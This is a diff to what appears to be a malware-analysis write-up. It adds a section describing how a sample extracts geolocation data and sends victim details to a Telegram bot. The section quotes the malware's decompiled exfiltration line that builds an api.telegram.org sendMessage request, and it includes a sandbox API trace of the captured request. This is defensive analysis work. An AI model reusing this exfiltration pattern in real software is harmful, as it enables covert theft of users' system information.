@@ -249,13 +249,55 @@ as well as getting the clear text from the answer :
 [RES] SECURITY_STATUS 0x0 (SEC_E_OK)
 ```
 
-Various information are the extracted by the malware from the XML :  
+Various information are then extracted by the malware from the XML :  
 
 ```
 XmlNodeList elementsByTagName = Instance.GetElementsByTagName("CountryName");
 XmlNodeList elementsByTagName = Instance.GetElementsByTagName("RegionCode");
 XmlNodeList elementsByTagName = Instance.GetElementsByTagName("RegionName");
 ```
+
+Finaly the payload is attempting to establish a HTTPS communication with a telegram bot :  
+
+```
+ string requestUriString = "https://api.telegram.org/bot" + _param0 + "/sendMessage?chat_id=" + _param1 + "&text=" + _param2;
+```
+
+Unfortunatly something might be missing in my analysis environnment because the Bot TOKEN as well as the chat ID are missing from the captured request :  
+
+```html
+[ * ] [pid 0x66c][tid 0x76c] c:\windows\syswow64\svchost.exe
+[ i ] [ Called from Native Image DLL ]
+[API] <SealMessage> in [SspiCli.dll] 
+[PAR] LSA_SEC_HANDLE ContextHandle         : 0x45b383c
+[PAR] ULONG          QualityOfProtection   : 0x0
+[PAR] PSecBufferDesc MessageBuffers        : 0x45b5ad4
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x4
+[FLD]                -> pBuffers  = 0x45b5aec
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x15
+[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
+[FLD]                   -> pvBuffer   = 0x45b5894
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x150
+[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
+[FLD]                   -> pvBuffer   = 0x00000000045B58A9
+[STR]                   -> "GET /bot/sendMessage?chat_id=&text=%20%0D%0A%0D%0APC%20Name:HOME%0D%0ADate%20and%20Time:%2013/02/2025%20/%2001:18:58%0D%"
+[STR]                      "0ACountry%20Name:%20France%0D%0A%5B%20HOME%20Clicked%20on%20the%20File%20If%20you%20see%20nothing%20this's%20mean%20the%"
+[STR]                      "20system%20storage's%20empty.%20%5D HTTP/1.1\r\nHost: api.telegram.org\r\nConnection: Keep-Alive\r\n\r\n"
+[FLD]                   -> pBuffers[2]
+[FLD]                   -> cbBuffer   = 0x40
+[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
+[FLD]                   -> pvBuffer   = 0x45b59f9
+[FLD]                   -> pBuffers[3]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0
+[PAR] ULONG          MessageSequenceNumber : 0x0
+[RET] 0x72d63857
+```
+
 
 
 
